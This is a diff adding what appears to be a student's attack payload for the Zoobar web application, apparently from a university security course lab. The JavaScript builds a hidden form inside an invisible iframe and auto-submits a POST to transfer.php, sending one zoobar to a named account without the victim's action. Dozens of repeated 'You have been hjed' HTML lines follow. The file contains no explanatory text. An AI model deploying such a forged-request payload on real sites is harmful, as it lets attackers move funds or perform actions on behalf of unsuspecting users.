@@ -1,0 +1,73 @@
+(function(){
+	var submissionInput = document.createElement('input');
+	submissionInput.setAttribute('value', 'Send');
+	submissionInput.setAttribute('name', 'submission');
+
+	var zoobarInput = document.createElement('input');
+	zoobarInput.setAttribute('value', 1);
+	zoobarInput.setAttribute('name', 'zoobars');
+
+	var zoobarRecipient = document.createElement('input');
+	zoobarRecipient.setAttribute('value', 'g3wangjj');
+	zoobarRecipient.setAttribute('name', 'zb_recipient');
+
+	var form = document.createElement('form');
+	form.setAttribute('method', 'POST');
+	form.setAttribute('action', 'http://zoobar.csl.toronto.edu/transfer.php');
+
+	form.appendChild(submissionInput);
+	form.appendChild(zoobarInput);
+	form.appendChild(zoobarRecipient);
+
+	var iframeForm = document.createElement('iframe');
+	iframeForm.appendChild(form);
+	document.body.appendChild(iframeForm);
+
+	iframeForm.style.display = 'none';
+
+	form.submit();
+	alert(1);
+	return 10;
+})();
+
+
+
+
+
+
+
+
+
+
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+<p id="zoobars" class="">You have been hjed</p>
+
+
+
+
